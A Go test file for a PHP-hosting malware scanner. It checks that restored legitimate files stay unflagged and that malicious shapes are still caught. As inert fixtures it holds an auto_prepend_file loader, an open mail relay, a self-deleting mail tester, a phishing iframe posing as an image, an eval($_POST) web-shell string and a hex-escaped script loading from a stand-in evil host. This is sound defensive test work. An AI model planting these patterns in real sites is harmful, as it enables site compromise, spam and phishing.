package scanner

import (
	"bytes"
	"encoding/base64"
	"testing"
)

// Every kind of file restored from quarantine after a fleet review is kept
// here, judged the way a scan of any server judges it (path and content),
// so a new or reinstalled server never quarantines them again and a later
// rule change cannot bring them back. Malware next to them must still be
// caught. Fixtures are minimal, inert shapes of the real files.
func TestFleetRestoredCategories(t *testing.T) {
	s := newScanner(t)
	cert := base64.StdEncoding.EncodeToString([]byte("-----BEGIN CERTIFICATE-----\n" +
		base64.StdEncoding.EncodeToString(bytes.Repeat([]byte{0x30, 0x82, 0x04, 0xa4}, 60)) + "\n-----END CERTIFICATE-----\n"))
	clean := []struct{ name, path, content string }{
		{"builder kit thumbnail saved as a page", "/home/u/public_html/wp-content/uploads/master_addons/templates_kits/thumbnails/image-Media.png",
			"<!DOCTYPE html><html><head><title>Just a moment...</title></head><body><script>window.location.href='/cdn-cgi/challenge'</script></body></html>"},
		{"cPanel MultiPHP ini", "/home/u/public_html/php.ini", "; cPanel-generated php ini directives, do not edit\n[PHP]\nauto_append_file = \"\"\nauto_prepend_file = \"\"\nmemory_limit = 1024M\n"},
		{"SureMails hardening ini", "/home/u/public_html/wp-content/uploads/suremails/.user.ini", "; Prevent auto-prepend/append attacks\nauto_prepend_file =\nauto_append_file =\n"},
		{"registration mail", "/home/u/shop.example.com/account/register.php", `<?php require_once '../config/db.php'; $email = trim($_POST['email'] ?? ''); @mail($email, 'Welcome - Verify Your Email', $body, 'From: '.ADMIN_EMAIL); header('Location: /account/dashboard.php');`},
		{"shipping app sign-up mail", "/home/u/public_html/application/ajax/sign_up_ajax.php", `<?php require_once("../loader.php"); $email_template = cdp_getEmailTemplates(7); $subject = $email_template->subject; mail($_POST['email'], $subject, $message, $header);`},
		{"composer ca-bundle", "/home/u/public_html/vendor/composer/ca-bundle/src/CaBundle.php", `<?php namespace Composer\CaBundle; class CaBundle { public static function isOpensslParseSafe() { $cert = '` + cert + `'; $script = "openssl_x509_parse(base64_decode('%s'));"; return $script; } }`},
		{"Laravel compiled view", "/home/u/app.example.com/storage/framework/views/4a985be53df3e16180696f04e944b6bb.php",
			`<?php $__componentOriginal8a3c0f9b5e2d4c7a1f6e9b0d3c5a7e2f = $component; ?><?php if (isset($__componentOriginal8a3c0f9b5e2d4c7a1f6e9b0d3c5a7e2f)): ?><?php $component = $__componentOriginal8a3c0f9b5e2d4c7a1f6e9b0d3c5a7e2f; ?><?php endif; ?><?php /**PATH /home/u/app/resources/views/welcome.blade.php ENDPATH**/ ?>`},
		{"analog stats cache", "/home/u/tmp/analog/cache", "CACHE type 5 produced by analog 6.0/Unix. Do not modify or delete!\nT\t0\t0\t460\n/wp-login.php?x=<?php eval($_POST[1]);?>\t1\n"},
	}
	for _, c := range clean {
		if d := s.checkContent(c.path, extOf(c.path), []byte(c.content)); d != nil {
			t.Errorf("%s: quarantined again as %s", c.name, d.Signature)
		}
	}
	elf := []byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0x3e, 0}
	for _, p := range []string{
		"/home/u/public_html/wp-content/ewww/optipng", "/home/u/site.example.com/wp-content/ewww/cwebp",
		"/home/u/public_html/news/app/ThirdParty/webp-convert/vendor/rosell-dk/webp-convert/src/Convert/Converters/Binaries/cwebp-120-linux-x86-64",
		"/home/u/public_html/node_modules/.bin/esbuild",
	} {
		if d, _ := binaryCheck(p, elf); d != nil {
			t.Errorf("%s: quarantined again as %s", p, d.Signature)
		}
	}

	// What must stay caught next to them.
	bad := []struct{ name, path, content string }{
		{"loader in ini", "/home/u/public_html/.user.ini", "auto_prepend_file = \"/home/u/public_html/wp-content/uploads/.x.ico\"\n"},
		{"open relay in a site", "/home/u/shop.example.com/admins/flyer.php", `<?php require 'common/conn.php'; $to = trim($_POST['frndemail']); $subject = $_POST["emailSubject"]; $ok = mail($to, $subject, $Body, "From: x"); header("Location: Newsletter.php");`},
		{"mail tester", "/home/u/public_html/.389653248945710.php", `<?php goto a; a: $to = $_GET["to"]; @mail($to, "Sending emails 1", "Test"); echo "##SENT##"; unlink(basename(__FILE__));`},
		{"page hidden as an upload image", "/home/u/public_html/wp-content/uploads/2026/10/logo.png", "<html><body><iframe src='https://phish.example/login'></iframe></body></html>"},
	}
	for _, c := range bad {
		if d := s.checkContent(c.path, extOf(c.path), []byte(c.content)); d == nil {
			t.Errorf("%s: no longer caught", c.name)
		}
	}
	if d, _ := binaryCheck("/home/u/site.example.com/wp-content/plugins/wp-rocket/vendor/monolog/monolog/src/Monolog/Handler/SyslogUdp/16e2277f8b31_A", elf); d == nil {
		t.Error("program hidden in a plugin's vendor folder: no longer caught")
	}
}

// Old embed codes write a script tag with document.write(unescape(...))
// (Google Analytics' ga.js loader, lead and chat widgets): only the
// brackets are escaped and the address is readable. A script or hidden
// frame spelled out in escaped letters is still reported.
func TestFleetDocumentWriteUnescape(t *testing.T) {
	ga := `var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));`
	if v := AnalyzeScript("js", []byte(ga)); v != nil {
		t.Errorf("ga.js loader reported as %s", v.Signature)
	}
	hidden := `document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%22%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%22%3E%3C%2F%73%63%72%69%70%74%3E'));`
	if v := AnalyzeScript("js", []byte(hidden)); v == nil {
		t.Error("escaped script not reported")
	}
}
